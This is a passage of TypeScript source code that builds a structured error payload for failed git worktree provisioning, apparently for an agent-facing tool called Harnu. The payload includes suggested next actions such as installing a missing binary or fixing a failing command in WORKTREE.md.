 * verbatim, so an agent reads facts (`kind`/`binary`/`rolledBack`/
 * `branchDeleted`) instead of parsing prose. Never has to probe `git worktree
 * list` to learn whether the worktree still exists.
 */
export function provisionErrorPayload(err: WorktreeProvisionError): Record<string, unknown> {
  const nextActions: ProvisionNextAction[] =
    err.kind === 'binary-missing'
      ? [
          {
            do: `Install ${err.binary ?? 'the missing tool'} (e.g. Node >= 22 for npm/npx), or make sure Harnu can see your existing install (mise/nvm/Homebrew — check the disclosed PATH), then retry create_worktree.`,
            why: `The setup shell could not find \`${err.binary ?? 'the command'}\` on its PATH.`
          }
        ]
      : [
          {
            do: `Fix the failing ${err.stage === 'delegated-create' ? 'create' : err.stage} command in WORKTREE.md, then retry create_worktree.`,
            why:
              err.kind === 'timeout'
                ? 'The command ran but did not finish before the setup timeout.'
                : 'The command ran and exited with a failure.'
          }
        ]
  return {
    error: 'WORKTREE_PROVISION_FAILED',
    message: err.message,
    stage: err.stage,
    ...(err.step ? { step: err.step } : {}),
    command: err.command,
    kind: err.kind,
    ...(err.binary ? { binary: err.binary } : {}),
    ...(err.path ? { path: err.path } : {}),
    ...(err.exitCode !== undefined ? { exitCode: err.exitCode } : {}),
    ...(err.stderr ? { stderr: err.stderr } : {}),
    rolledBack: err.rolledBack,
    branchDeleted: err.branchDeleted,
    nextActions
  }
}
